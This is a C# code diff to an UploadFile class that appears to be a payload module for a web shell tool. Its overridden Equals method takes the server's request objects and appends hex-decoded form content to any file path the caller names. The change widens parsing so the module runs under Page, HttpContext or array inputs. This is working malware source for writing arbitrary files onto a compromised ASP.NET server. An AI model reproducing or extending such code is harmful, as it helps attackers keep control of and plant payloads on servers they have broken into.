@@ -16,9 +16,7 @@ public class UploadFile
 
     public override bool Equals(object obj)
     {
-        Page page = (Page) obj;
-        this.Response = page.Response;
-        this.Request = page.Request;
+        this.parseObj(obj);
         this.cs = "UTF-8";
         this.encoder = "base64";
         this.decoder = "";
@@ -31,7 +29,7 @@ public class UploadFile
         {
             String path = decode(this.Request.Form["path"]);
             String content = decode(this.Request.Form["content"]);
-            result += this.UploadFileCode(path,content);
+            result += this.UploadFileCode(path, content);
         }
         catch (Exception e)
         {
@@ -42,14 +40,39 @@ public class UploadFile
         return true;
     }
 
-    public string UploadFileCode(String path,String content)
+    public void parseObj(Object obj)
+    {
+        if (obj.GetType().IsArray)
+        {
+            Object[] data = (Object[])obj;
+            this.Request = (HttpRequest)data[0];
+            this.Response = (HttpResponse)data[1];
+        }
+        else
+        {
+            try
+            {
+                Page page = (Page)obj;
+                this.Response = page.Response;
+                this.Request = page.Request;
+            }
+            catch (Exception)
+            {
+                HttpContext context = (HttpContext)obj;
+                this.Response = context.Response;
+                this.Request = context.Request;
+            }
+        }
+    }
+
+    public string UploadFileCode(String path, String content)
     {
         byte[] B = new Byte[content.Length / 2];
         for (int i = 0; i < content.Length; i += 2)
         {
-            B[i / 2] = (byte) Convert.ToInt32(content.Substring(i, 2), 16);
+            B[i / 2] = (byte)Convert.ToInt32(content.Substring(i, 2), 16);
         }
-        
+
         FileStream fs = new FileStream(path, FileMode.Append);
         fs.Write(B, 0, B.Length);
         fs.Close();
